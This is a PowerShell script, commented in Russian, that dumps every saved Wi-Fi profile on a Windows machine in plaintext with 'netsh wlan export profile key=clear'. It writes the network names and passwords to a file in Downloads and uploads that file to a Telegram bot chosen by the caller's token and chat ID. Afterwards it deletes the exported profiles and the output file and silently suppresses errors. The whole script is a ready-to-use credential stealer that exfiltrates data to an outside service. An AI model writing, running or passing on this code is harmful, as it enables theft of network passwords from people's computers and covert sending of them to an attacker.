# Принимаем параметры извне
param(
    [Parameter(Mandatory=$true)]
    [string]$BotToken,
    [Parameter(Mandatory=$true)]
    [string]$ChatID
)

# Далее следует ваш оригинальный код, но вместо захардкоженных значений используем переменные $BotToken и $ChatID
$TempDir = "$env:temp\wifi-passwords"
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
Set-Location $TempDir

netsh wlan export profile key=clear | Out-Null

$OutputFile = "$env:USERPROFILE\Downloads\info123.txt"
"Сохраненные пароли Wi-Fi`n" > $OutputFile
"=========================`n" >> $OutputFile

Get-ChildItem -Path "*.xml" | ForEach-Object {
    $XmlData = [xml](Get-Content $_.FullName)
    $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
    $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    "SSID: $SSID`nПароль: $Password`n" >> $OutputFile
    Remove-Item $_.FullName
}

# Отправляем файл в Telegram (используем переданные параметры)
$TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendDocument"
$Form = @{
    chat_id = $ChatID
    document = Get-Item -Path $OutputFile
}

try {
    Invoke-RestMethod -Uri $TelegramAPIUrl -Form $Form -Method Post | Out-Null
} catch {
    # Обработка ошибок
}

# Уборка
Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue
